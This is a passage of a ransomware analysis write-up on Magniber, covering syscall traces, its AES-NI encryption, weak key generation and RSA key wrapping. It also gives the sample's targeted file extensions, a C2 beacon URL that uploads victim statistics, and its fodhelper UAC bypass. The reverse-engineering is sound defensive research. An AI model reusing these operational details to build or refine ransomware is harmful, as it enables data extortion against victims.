called\nvia syscall. In contrast to the previous part, this time the call is made from the static code (saved\nin the PE section, rather than in a dynamically allocated memory), so it is easy to patch it out. I\ndid it just by NOP-in the syscall in PE-bear.\n\nSyscall responsible for executing NtCreateUserProcess viewed in PE-bear:\n\nThe same syscall after being NOP-ed out:\n\nNow the tracing proceeds further, to the files encryption.\n\nJust like in the previous case, first I traced it without parameters, to have an overview of what\nfunctions are going to be called, and then added relevant entries into parameters.txt. Some\nnew function has been added, comparing with the part 1.\n```\nntdll;NtQueryDirectoryFile;10\nntdll;NtQueryInformationProcess;5\nntdll;NtSetInformationFile;5\n\n```\nThe malware keeps running for quite a while (as the execution is slowed down because of the\ninstrumentation with Pin), but we can preview the log in the real time with the help of tools like\nbaretail. By looking at the executed function it seems to be indeed files encryption. Waiting for\nfull system encryption to finish makes no sense, so I decided to break the execution manually\nand terminate the process.\n\nFragment of the resulting tracelog:\n\n\n-----\n\n```\n2000;section: [shellc]\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {\\xbf\\xd8\\xd2\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {\\xc5\\xf9\\xd2\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {\\x19\\xfc\\xd2\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {m\\x06\\xd3\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {\\xb8\\x08\\xd3\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {P\\x0a\\xd3\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {\\xc0\\x0b\\xd3\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {E\\x0d\\xd3\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014fb00 -> {\\xc2\\x0e\\xd3\\x82\\x06\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n196aa;SYSCALL:0x34(NtDelayExecution)\n\n1969f;SYSCALL:0x19(NtQueryInformationProcess)\n\n1967e;SYSCALL:0x18(NtAllocateVirtualMemory)\n\n```\n\n-----\n\n```\nNtAllocateVirtualMemory:\n\n     Arg[0] = 0xffffffffffffffff = 18446744073709551615\n\n     Arg[1] = ptr 0x000000000014fb08 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0\n\n     Arg[3] = ptr 0x000000000014fb00 -> {\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[4] = 0x14801af200001000 = 1477210304461934592\n\n     Arg[5] = 0x14d8106a00000004 = 1501968523180638212\n\n196d6;SYSCALL:0x33(NtOpenFile)\n\nNtOpenFile:\n\n     Arg[0] = ptr 0x000000000014faf8 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = 0x0000000000100080 = 1048704\n\n     Arg[2] = ptr 0x000000000014fa90 -> L\"0\"\n\n     Arg[3] = ptr 0x000000000014fa58 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[4] = 0x14801af200000001 = 1477210304461930497\n\n     Arg[5] = 0x14d8106a00000021 = 1501968523180638241\n\n[...]\n\n```\nBy looking at the tracelog, we can clearly see fragments that resemble file encryption. Relevant\nfragments:\n\n\n-----\n\n```\n1972e;SYSCALL:0x11(NtQueryInformationFile)\n\n196c0;SYSCALL:0x55(NtCreateFile)\nNtCreateFile:\n\n     Arg[0] = ptr 0x000000000014ef08 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[1] = 0x0000000000120116 = 1179926\n\n     Arg[2] = ptr 0x000000000014eb88 -> L\"0\"\n\n     Arg[3] = ptr 0x000000000014eae0 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[4] = 0\n\n     Arg[5] = 0x0000000000000080 = 128\n\n     Arg[6] = 0x0000000000000003 = 3\n\n     Arg[7] = 0x0000000000000001 = 1\n\n     Arg[8] = 0x0000000000000120 = 288\n\n     Arg[9] = 0\n\n1967e;SYSCALL:0x18(NtAllocateVirtualMemory)\n\nNtAllocateVirtualMemory:\n\n     Arg[0] = 0xffffffffffffffff = 18446744073709551615\n\n     Arg[1] = ptr 0x000000000014ea78 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0\n\n     Arg[3] = ptr 0x000000000014eac8 -> {\\x00\\x01\\x10\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[4] = 0x0000000000001000 = 4096\n\n     Arg[5] = 0x0000000000000004 = 4\n\n1967e;SYSCALL:0x18(NtAllocateVirtualMemory)\n\nNtAllocateVirtualMemory:\n\n     Arg[0] = 0xffffffffffffffff = 18446744073709551615\n\n     Arg[1] = ptr 0x000000000014eaa0 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0\n\n     Arg[3] = ptr 0x000000000014ea68 -> {\\x00\\x01\\x10\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[4] = 0x0000000000001000 = 4096\n\n     Arg[5] = 0x0000000000000004 = 4\n\n196e1;SYSCALL:0x6(NtReadFile)\n\n196cb;SYSCALL:0x8(NtWriteFile)\nNtWriteFile:\n\n     Arg[0] = 0x0000000000000470 = 1136\n\n     Arg[1] = 0\n\n     Arg[2] = 0\n\n     Arg[3] = 0\n\n     Arg[4] = ptr 0x000000000014ea38 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[5] = ptr 0x00000000163c0000 -> {\\x01`\\xa4\\x13H\\xc7w.}\n\n     Arg[6] = 0x00000000000005a0 = 1440\n\n     Arg[7] = 0\n\n     Arg[8] = 0\n\n1967e;SYSCALL:0x18(NtAllocateVirtualMemory)\n\nNtAllocateVirtualMemory:\n\n     Arg[0] = 0xffffffffffffffff = 18446744073709551615\n\n     Arg[1] = ptr 0x000000000014ea70 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[2] = 0\n\n     Arg[3] = ptr 0x000000000014eaa8 -> {\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[4] = 0x0000000000001000 = 4096\n\n     Arg[5] = 0x0000000000000004 = 4\n\n\n```\n\n-----\n\n```\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014e890 -> {\\x16)\\xb4\\xb4\\x05C\\xd0\\x92}\n\n     Arg[1] = 0\n\n[...]\n\n19694;SYSCALL:0x31(NtQueryPerformanceCounter)\n\nNtQueryPerformanceCounter:\n\n     Arg[0] = ptr 0x000000000014e890 -> {h\\xa1\\xe1\\x9e\\x04\\x00\\x00\\x00}\n\n     Arg[1] = 0\n\n196cb;SYSCALL:0x8(NtWriteFile)\nNtWriteFile:\n\n     Arg[0] = 0x0000000000000470 = 1136\n\n     Arg[1] = 0\n\n     Arg[2] = 0\n\n     Arg[3] = 0\n\n     Arg[4] = ptr 0x000000000014ea38 -> {\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\n\n     Arg[5] = ptr 0x0000000013990000 -> {\\xe4|\\xfa\\x96\\xeb!\\x89\\xea}\n\n     Arg[6] = 0x0000000000000100 = 256\n\n     Arg[7] = 0\n\n     Arg[8] = 0\n\n19689;SYSCALL:0x1e(NtFreeVirtualMemory)\n\n196b5;SYSCALL:0xf(NtClose)\n\n196b5;SYSCALL:0xf(NtClose)\n\n196b5;SYSCALL:0xf(NtClose)\n\n```\nFiles are repeatedly read, and then written to. We can see a heavily use of the function\n```\nNtQueryPerformanceCounter in each such round. This function is a low-level equivalent of\nQueryPerformanceCounter, which MSDN explains in the following way:\n\n```\nRetrieves the current value of the performance counter, which is a high resolution (<1us)\ntime stamp that can be used for time-interval measurements.\n\nI suspect that this ransomware uses it as a source of entropy, but we will see if this assumption\nis valid using static analysis…\n\n## Going deeper…\n\nHaving the tags generated by Tiny Tracer, we can apply them into IDA, or Ghidra, using the tools\n[mentioned here.](https://github.com/hasherezade/tiny_tracer/wiki/Using-the-TAGs-with-disassemblers-and-debuggers)\n\nI loaded the Tags into IDA, using IFL plugin, and renamed the functions with syscalls accordingly\nto what system function do they execute.\n\n\n-----\n\nNow we can follow the interesting functions by their references, to see the whole code context in\nwhich they are executed.\n\nWhen we come in contact with a new ransomware, often the first questions we ask is, if it is\ndecryptable, and what is the scale of the damage done. In order to know it, we will analyze what\nalgorithm is used, how the keys are generated, how the keys are protected, etc.\n\n### Encryption algorithm\n\nThe function responsible for file encryption can be found by following the references of\n```\nNtReadFile.\n\n```\nBetween the reads and the writes into a file (NtReadFile and NtWriteFile) we can find how the\nread chunk is being encrypted:\n\n\n-----\n\nMost of the ransomware authors use AES for file encryption. Magniber follows this trend. But the\nintresting part is the implementation. Instead of using a common implementation that works at a\nhigher abstraction level (and i.e. leverage some of the known libraries, or Windows Crypto API\nas the old Magniber did) authors made a bold choice to go for a low-level one, via the (relatively)\n[new Intel instructions for AES encryption (AES-NI extension). Using AES-NI allows for much](https://www.intel.com/content/www/us/en/developer/articles/technical/advanced-encryption-standard-instructions-aes-ni.html)\nfaster encryption, but the cost of is to drop the backward compatibility with older machines that\ndon’t support it. As well it makes the used algorithm obvious at first look at the assembly, which\nis not neccessarily beneficial from the malware author’s perspective.\n\nFirst, the key is initialized by the function that also has AES-NI based implementation\n(referenced as aes_low_level_keygen):\n\n\n-----\n\n[We can see the AES-NI instruction AESKEYGENASSIST used in order to prepare the AES](https://www.felixcloutier.com/x86/aeskeygenassist)\ncontext.\n\n\n-----\n\nThen we can see how the next chunk of data is loaded, and encrypted by consecutive AES\n[rounds, using the instruction AESENC. At the end, an instruction](https://www.felixcloutier.com/x86/aesenc) [AESENCLAST is used to](https://www.felixcloutier.com/x86/aesenclast)\nfinalize the encryption.\n\n### AES key generation\n\nThe next important point is to check how the AES key gets generated.\n\n**The random generator**\n\nBy observing the flow earlier on, I started to suspect that the function\n```\nNtQueryPerformanceCounter is used as a source of entropy, to initialize all sort of\n\n```\npseudorandom variables. Indeed, this native function is incorporated in a function made for\ngenerating random values:\n\nThe function has the following prototype, allowing to supply the range from which the random\nnumber should be selected:\n```\n__int64 __fastcall make_pseudo_random(unsigned int min, unsigned int max);\n\n```\n\n-----\n\nThe function comes with a table of 100 pseudorandom DWORDs. Then, a simple algorithm\nmaking use of `NtQueryPerformanceCounter is executed, in order to select a random index from`\nthis table. Basing on the value from the table at this index, and the given min and max values,\nthe final pseudorandom value is calculated. In case if the calculated value failed to fit in the\nrange, a new attempt is made recursively.\n\nThe interesting point at this moment is, that the random value is selected in fact from the\nhardcoded table. So, if we consider that our random value must be of size 1 byte, then, instead\nof the typical range of 255 options to select from, the range of options narrows down to 100\nwhich is the table size.\n\nNote, that we can see some general similarities with the analogous function from the old edition\nof Magniber, yet the implementation differs:\n\n_The random generator used in the old Magniber (2017)_\n\nYet, in the old version this random generator is not used to derive the keys.\n\n[We must note that neither GetTickCount, nor](https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount) `NtQueryPerformanceCounter is a`\ncryptographicaly secure source of entropy. In both cases, the values generated are incremental,\nnot random, and relative to the system start. Yet, GetTickCount has lower resolution, so finding\nthe initial value that started the series (seed) is much easier.\n\n### Generating AES key and IV\n\nThe aforementioned function is used in multiple places in the code, but what interests us the\nmost at this point, is that is is used for the generation of AES key and IV used for files\nencryption:\n\n\n-----\n\nBoth AES key and IV are 16 bytes long, which makes it AES 128.\n\nThe range from which the values are selected is 1 to 254, which is yet more narrow than typical\n0 to 255.\n\nI conducted and experiment by hooking the function, and checking what is the possible set of\nthe values of one pseudorandom byte from this range. It turns out, that this set has only 67\nelements (unlike 255, as it would be for the full BYTE range):\n```\n{ 5, 9, f, 13, 15, 1d, 20, 23, 2f, 31, 33, 35, 37, 39, 3d, 3f, 41, 45, 47, 49, 4b, 55,\n59, 5b, 5d, 61, 62, 63, 64, 69, 6b, 6c, 6f, 72, 79, 7e, 7f, 81, 83, 87, 8f, 90, 91, 93,\n97, 99, 9d, 9f, a1, a7, ab, af, b3, c1, c3, cb, cd, d5, e1, e5, e7, e9, eb, f3, f4, f7,\nfb }\n\n```\nSo, in order to generate the key, we are selecting 16 values out of the 67 elements set, which\ngives 67^16 permutations. It gives 1.6489096e+29. So, although the key is a bit weakened, it is\nstill impossible to brutforce.\n\nGenerated AES key and IV:\n\n\n-----\n\nWe can further confirm that the generated key was used to initialize the AES context:\n\n[By supplying the dumped data to CyberChef, we can confirm that it is a valid implementation of](https://gchq.github.io/CyberChef/)\nAES 128, and the used mode is CBC .\n\n\n-----\n\nThe same cipher was used by the old Magniber s edition: yet, its implementation, as well as key\ngeneration was very different.\n\n### Protecting AES key and IV\n\nEven if the AES key and IV have been generated properly, there is still one point of a possible\nweakness, and that is about how they are protected.\n\nAfter the encrypted chunks of the file are being written, there is yet another call to NtWriteFile.\nThis time it is used to save the encrypted AES key and IV.\n\nThe algorithm used to protect them seems to be a custom implementation of RSA (we will verify\nits correctness further on).\n\n_The generated key and IV are stored together in a buffer, and then passed to the asymmetric_\n_crypto function._\n\n\n-----\n\nThe ransomware uses attacker s public key that is hardcoded in the binary:\n\nThe public key is copied and passed to the function:\n\n\n-----\n\nOnce the buffer containing the AES key and IV is passed to the function, the random padding is\nappended to it:\n\nInside the function denoted as apply_assymmetric_crypto we can see some building blocks\ntypical for RSA:\n\nThe prepared data, containing the AES key and IV are encrypted, and then copied to the output\nbuffer.\n\n### Verifying the RSA implementation\n\n\n-----\n\nVerifying the RSA implementation by static analysis may be a laborious tasks. So, I am gonna\nuse a shortcut. I will dump the data involved in the encryption process: n – key, e – exponent,\nand m – message, and repeat the encryption with the help of public tools, where I am sure the\nRSA has been implemented correctly. If I can obtain the same ciphertext, it means that the\nimplementation in the malware is valid.\n\nI hooked the function apply_assymmetric_crypto and dumped the elements listed below. Full\n[code of the loader can be found here.](https://gist.github.com/hasherezade/6662b534d08786ddf1ba73457d4b94fe)\n\n_Mind the fact that the order of bytes in the dumped buffer needs to be reversed. This can be_\n_[done conveniently with CyberChief. Example here.](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Byte')To_Hex('Space',0)&input=NjAgMTAgNTUgM0IgQ0MgRDAgRjIgN0QgMEYgMzQgNUUgRUUgMDIgQUMgMUEgMzIgMTYgNjQgNjkgRjcgRDYgNUYgNkUgNzMgRjEgRTEgRTYgQjUgNzggNjkgNDEgQjUgQzUgREEgRUMgRTYgRDAgOEEgRTUgM0MgOEMgQTAgQjYgQTYgMUMgMzMgNjQgREIgN0UgQTYgREIgRUMgNzggRjAgMzkgQTcgNTcgRjMgMTYgREEgNkIgN0YgMDUgNDcgNDMgQ0YgMUYgRDUgNDggOTggRkEgOUEgNEIgNzcgODcgRUIgRUYgRUYgMTIgQ0YgQUMgMDcgQkIgM0IgNDMgOEQgNzkgMDEgRjkgNkQgNjcgMEQgMzMgNzUgNDcgQ0QgMEUgQTIgNDkgM0UgOTEgQzUgODEgMEUgNkYgRjEgQkUgOTYgQTMgMzMgNEUgMUMgMDQgOUIgMkUgQjEgNzIgQUEgRjggNTMgRjQgMTYgNUEgQjggNEUgQTEgMjMgN0YgQTAgMTcgMjUgNzAgMkMgODkgMUMgOTAgMjYgQzIgN0MgMDUgRDYgODIgRTggRDYgMTMgRTYgNDIgMDkgRUIgNkYgRDggQkYgN0MgRjEgMDMgREIgNDIgOUYgNjUgMDIgMEUgRDkgODkgNTggRUIgMkEgNjIgNEMgRjkgMjcgMUUgQ0EgMDEgNkMgQTggRTEgODcgNEEgOTAgRDIgOEEgNjcgQ0UgOTcgMjUgNUIgRDEgMEEgNUIgQkMgM0MgNDIgMEYgNzkgMTIgNEMgOUEgMzQgOTQgRUYgNTggNTcgMTUgRDggRDUgNzAgMjMgODggMkUgRjEgNDggRUQgQTIgMjAgNjggMEQgODUgMEEgNUIgMDkgQUQgMDAgMjQgNTIgOTIgOUQgRTAgMUEgQzkgRjIgRTMgNDIgREYgNDkgOTAgRjIgMUMgQjYgNkEgOTIgRUYgODQgMUUgMDAgREIgQjcgRTggODggMjQgMEIgNEIgODIgQjAgMTkgMkQgMTE)_\n\nRSA key components:\n\n**e =** `10001`\n\n**n = c6 c2 f7 3c 03 46 3d 1b 4e 3e a9 03 bb 4d 3a 6c cb f3 88 cf 53 5b 43 cb 75 17**\n```\n97 8a 73 c6 88 01 46 ba cd 65 69 bf ef 20 f0 0a b2 a7 99 6d 3c 87 f1 a5 21 94 c1\n53 1f 8c b6 69 3d 7e d0 d4 a4 ba 63 d1 37 8e 0f af 4b b5 71 4e 58 d0 7e 64 a0 2f\n4d 16 43 fa 9f 51 19 b3 99 5d 7c 7d 66 e0 62 06 d3 cd 1c 63 76 5e 25 64 84 a1 dc\n1e 09 84 e6 76 e3 48 aa a7 c3 66 e2 28 9f 3c 81 64 5b 6a 04 3d 92 e7 bf e9 65 39\nc3 f6 53 fa 70 96 11 15 a5 50 75 76 e7 31 94 53 7c e6 5a bb 75 19 7a 6f 21 3b e0\ndb 42 cb 9f c7 d2 04 80 70 e8 83 d5 35 1e a7 40 ef d6 42 8c 2e 5e de f0 c9 51 fe\n80 0f 6b 0b 16 13 3e 2b f1 e2 12 d9 58 8b 18 47 77 b2 2f 83 53 d6 a9 74 99 18 e2\nec 14 36 d1 6a bd 5c 00 77 ae 7f 52 26 7b e9 04 02 a8 e1 12 53 50 6c b8 34 2d da\n11 bd c6 c4 b7 d9 19 02 16 9b 32 b4 1f 15\n\n```\nContent to be encrypted: random AES key + IV (hilighted) + padding:\n\n**m =** `00 02 ab 7e 91 79 c1 59 64 2f 7e af 7f c1 59 eb 13 7e af 7f 33 59 b3 0f 79 a1`\n```\n1d 31 37 b3 0f 8f 9d 1d 35 81 c3 0f 6f 91 ab e1 81 64 41 6f 91 79 e1 81 64 2f 7e\n91 7f 33 59 eb 13 79 af 7f 33 37 b3 13 35 59 e7 72 41 f7 eb e5 f4 fb 72 41 f7 93\n39 f4 fb ab eb f7 6f 91 ab e1 81 64 41 6f 91 79 c1 81 64 13 7e af 7f 33 72 41 f7\n93 e5 f4 fb ab eb 41 6f 91 ab e1 81 64 41 6f 91 79 e1 81 64 2f 7e cd 99 e7 09 97\n33 3d 61 3f 79 45 97 33 93 e5 f4 fb ab 41 f7 93 39 ab fb 81 64 41 6f 91 79 c1 81\n64 13 7e af 7f 33 37 eb 13 8f a1 1d 31 55 b3 0f 6c e7 c3 35 81 cb cb 6c e7 5d 5b\n20 99 b3 ab 83 90 15 69 05 b3 49 5b 8f 62 59 79 0f 49 b3 15 7f 63 41 6c e7 5d 33\n20 99 41 ab 33 5d 33 a7 00 f7 93 39 ab e1 81 64 13 7e af 7f 31 37 b3 cb 6c e7 63\n3d 05 b3 4b b3 8f 62 6b 59 e9 61 09 f3 33\n\n```\nThe resulting ciphertext:\n\n**c =** `11 2d 19 b0 82 4b 0b 24 88 e8 b7 db 00 1e 84 ef 92 6a b6 1c f2 90 49 df 42 e3`\n```\nf2 c9 1a e0 9d 92 52 24 00 ad 09 5b 0a 85 0d 68 20 a2 ed 48 f1 2e 88 23 70 d5 d8\n15 57 58 ef 94 34 9a 4c 12 79 0f 42 3c bc 5b 0a d1 5b 25 97 ce 67 8a d2 90 4a 87\ne1 a8 6c 01 ca 1e 27 f9 4c 62 2a eb 58 89 d9 0e 02 65 9f 42 db 03 f1 7c bf d8 6f\neb 09 42 e6 13 d6 e8 82 d6 05 7c c2 26 90 1c 89 2c 70 25 17 a0 7f 23 a1 4e b8 5a\n16 f4 53 f8 aa 72 b1 2e 9b 04 1c 4e 33 a3 96 be f1 6f 0e 81 c5 91 3e 49 a2 0e cd\n47 75 33 0d 67 6d f9 01 79 8d 43 3b bb 07 ac cf 12 ef ef eb 87 77 4b 9a fa 98 48\n\n```\n\n-----\n\n```\nd5 1f cf 43 47 05 7f 6b da 16 f3 57 a7 39 f0 78 ec db a6 7e db 64 33 1c a6 b6 a0\n8c 3c e5 8a d0 e6 ec da c5 b5 41 69 78 b5 e6 e1 f1 73 6e 5f d6 f7 69 64 16 32 1a\nac 02 ee 5e 34 0f 7d f2 d0 cc 3b 55 10 60\n\n```\nReproducing the steps with a public tool, at: https://www.boxentriq.com/code-breaking/modularmultiplicative-inverse :\n\n\n-----\n\nWe can see that indeed, our output is identical like the one generated by the malware, so the\nRSA implementation is correct. No luck this time!\n\nHowever, since the malware doesn’t generate a new keypair per each victim, and only uses the\nRSA key hardcoded in the sample, it may be possible to reuse the private key once purchased\nfrom the attacker, and share it with other victims of the identical sample.\n\n### What is encrypted\n\nDuring the check with the help of FLOSS, we found in some directories hardcoded in the\nshellcode, that will be excluded from the encryption:\n```\nFLOSS static Unicode strings\n\n[...]\n\ndocuments and settings\n\nappdata\n\nlocal settings\n\nsample music\n\nsample pictures\n\nsample videos\n\ntor browser\n\nrecycle\n\nwindows\n\nboot\n\nintel\n\nmsocache\n\nperflogs\n\nprogram files\n\nprogramdata\n\nrecovery\n\nsystem volume information\n\nwinnt\n\n[...]\n\n```\nThis list is being used at the beginnign of the function responsible for encrypting directory\ncontent:\n\nYet, our extracted list of strings didn’t contain the attacked extensions – althougt it was clear\nduring the behavioral analysis that not all files are encrypted. Let’s have a closer look at how this\ndistinction is being made:\n\n\n-----\n\nThe filtering of the files is done, by calculating hashes of their extensions, and then comparing\nthem with a hardcoded list.\n\nThe function calculating the extension hash:\n\n\n-----\n\nThe list of the valid extension hashes is hardcoded in the malware. We can find the matching\nextension just by a brutforce method.\n\n\n-----\n\nAgain, I didn t want to waste time reimplementing functions responsible for hashing the\nextensions, and for checking them, so I just plug the functions from the original malware to my\n[code. You can see the brutforcer here.](https://gist.github.com/hasherezade/86dd770cba355e0c4b950268869a5921)\n\nThere are two list of extensions that can be selected depending on the flag passed to the\nfunction encrypting a directory:\n```\nList 0:\narc asf avi bak bmp fla flv gif gz iso jpeg jpg mid mkv mov mpeg mpg paq png rar swf tar\ntbk tgz tif tiff vcd vmdk vob wav wma wmv zip\n\nList 1:\nabm abs abw act adn adp aes aft afx agif agp ahd ai aic aim albm alf ans apd apm apng aps\napt apx art arw asc ase ask asm asp asw asy aty awdb awp awt aww azz bad bay bbs bdb bdp\nbdr bean bib bmx bna bnd boc bok brd brk brn brt bss btd bti btr c ca cals can cd cdb cdc\ncdg cdmm cdmt cdmz cdr cdt cf cfu cgm cimg cin cit ckp clkw cma cmx cnm cnv colz cpc cpd\ncpg cpp cps cpx crd crt crw cs csr csv csy ct cvg cvi cvs cvx cwt cxf cyi dad daf db dbc\ndbf dbk dbs dbt dbv dbx dca dcb dch dcr dcs dct dcx dd dds ded der dgn dgs dgt dhs dib\ndif dip diz djv djvu dmi dmo dnc dne doc docb docm docx docz dot dotm dotx dpp dpx dqy\ndrw drz dsk dsn dsv dt dta dtsx dtw dv dvi dwg dx dxb dxf eco ecw ecx edb efd egc eio eip\neit em emd emf emlx ep epf epp eps epsf eq erf err etf etx euc exr fa faq fax fb fbx fcd\nfcf fdf fdr fds fdt fdx fdxt fes fft fi fic fid fif fig flr fmv fo fodt fpos fpt fpx frm\nfrt frx ftn fwdn fxc fxg fzb fzv gcdp gdb gdoc gem geo gfb gfie ggr gih gim gio glox gpd\ngpg gpn gro grob grs gsd gthr gtp gv gwi h hbk hdb hdp hdr hht his hp hpg hpi hs htc hwp\nhz ib ibd icn icon icpr idc idea idx igt igx ihx ii iiq imd info ink ipf ipx itdb itw iwi\nj jar jas java jbig jbmp jbr jfif jia jis jng joe jpe jps jpx jrtf js jsp jtf jtx jw jxr\nkdb kdbx kdc kdi kdk kes key kic klg knt kon kpg kwd lay lbm lbt ldf lgc lis lit ljp lmk\nlnt lrc lst ltr ltx lue luf lwo lwp lws lyt lyx ma mac man map maq mat max mb mbm mbox\nmdb mdf mdn mdt me mef mel mft mgcb mgmf mgmt mgmx mgtx min mm mmat mnr mnt mos mpf mpo\nmrg mrxs msg mud mwb mwp mx my myd myi ncr nct ndf nef nfo njx nlm now nrw nsf nyf nzb\nobj oce oci ocr odb odg odm odo odp ods odt of oft omf oplc oqy ora orf ort orx ost ota\notg oti otp ots ott ovp ovr owc owg oyx ozb ozj ozt p pa pan pano pap pas pbm pcd pcs pdb\npdd pdf pdm pds pdt pef pem pff pfi pfs pfv pfx pgf pgm phm php pic pict pix pjpg pjt plt\npm pmg pni pnm pntg pnz pobj pop pot potm potx ppam ppm pps ppsm ppsx ppt pptm pptx prt\nprw psd psdx pse psid psp pst psw ptg pth ptx pu pvj pvm pvr pwa pwi pwr px pxr pza pzp\npzs qd qmg qpx qry qvd rad ras raw rb rctd rcu rd rdb rft rgb rgf rib ric riff ris rix\nrle rli rng rpd rpf rpt rri rs rsb rsd rsr rst rt rtd rtf rtx run rw rzk rzn saf sam sbf\nscad scc sch sci scm sct scv scw sdb sdf sdm sdoc sdw sep sfc sfw sgm sh sig skm sla sld\nsldm sldx slk sln sls smf sms snt sob spa spe sph spj spp spq spr sq sqb srw ssa ssk st\nstc std sti stm stn stp str stw sty sub suo svf svg svgz sxc sxd sxg sxi sxm sxw tab tcx\ntdf tdt te tex text thp tlb tlc tm tmd tmv tmx tne tpc trm tvj udb ufr unx uof uop uot\nupd usr utxt vb vbr vbs vct vdb vdi vec vm vmx vnt vpd vrm vrp vsd vsdm vsdx vsm vstm\nvstx vue vw wbk wcf wdb wgz wire wks wmdb wn wp wpa wpd wpg wps wpt wpw wri wsc wsd wsh\nwtx x xar xd xdb xlc xld xlf xlgc xlm xls xlsb xlsm xlsx xlt xltm xltx xlw xps xwp xyp\nxyw ya ybk ym zabw zdb zdc zw\n\n```\nThe encrypting function is going to be called twice, each time a different list is enabled:\n\n\n-----\n\nSo, both lists are going to be used.\n\n## Communication with the C2\n\nThe malware comes with an ability to communicate with the C2, for the purpose of upload of the\nstatistics. After the series of encryption has finished, and if at least 100 files got encrypted, it\nsends an information about it to the server:\n\nThe passed data, including the unique victim ID, and various counts of the attacked targets, is\nmerged together to create a URL. Example:\n```\nL\"http://8e50de00b650821vieijibfm.jobsoon.fun/vieijibfm&2&1367508359&14525&55144&2219043\"\n\n```\n\n-----\n\nThe base URL (jobsoon.fun) is hardcoded in the sample as a stack-based string, similarly to\nthe name of the DLL to be loaded: wininnet.dll, that will be used for the internet connection.\n\nThe relevant functions are loaded by their hashes, using the common technique involbing PEB\n[lookup (similat to this one).](https://github.com/hasherezade/demos/tree/master/functions_loader)\n\n## Privilege elevation\n\n[The UAC bypass attempt involving fodhelper.exe (based on the PoC: FodhelperBypass.ps1.),](https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1)\nthat we observed during the tracing is executed between two series of files encryption. First the\nmalware is trying to encrypt files without elevating the privileges. After it finished, it makes\nattempt to deploy the UAC bypass (without any prior checks if it is required). Then another\nattempt of deploying the encryption functions is being made.\n\n\n-----\n\n## Usage of KUSER_SHARED_DATA\n\nWhile analyzing the code, we can see references to some hardcoded memory address.\nExample:\n\nThis address resolves to KUSER_SHARED_DATA:\n```\nKUSER_SHARED_DATA is a read-only memory page, containing a structure with many intresting\n\n```\ninformation about the system, that is mapped both in the user mode and the kernel mode (more\ninfo [here and](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data) [here).](https://osm.hpi.de/wrk/2007/08/getting-os-information-the-kuser_shared_data-structure/)\n\n\n-----\n\nA convenient dump of the whole structure for a current system can be done with the help of\n[WinDbg – example here. We can further use this dump to resolve what field is referenced by a](https://gist.github.com/hasherezade/ced8835e3da33d83b7f17d312f2a7d53)\nparticual address.\n\n### Windows Build Number and syscalls selection\n\nOne of the fields that is quite often used by the malware is NtBuildNumber. It is first used at the\nbeginning of the shellcode – if the build number was lower than the hardcoded one, the malware\nwon’t run at all:\n\nThis makes sense, because the numbers of syscalls may differ depending on Windows version\n– and this malware have them hardcoded. In order to guarantee a backward compatibility, the\nauthors would have to retrieve the syscall numbers automatically from ntdll. Clearly they\nwanted to avoid this hassle. As a result, all Windows version below 10 will be spared from 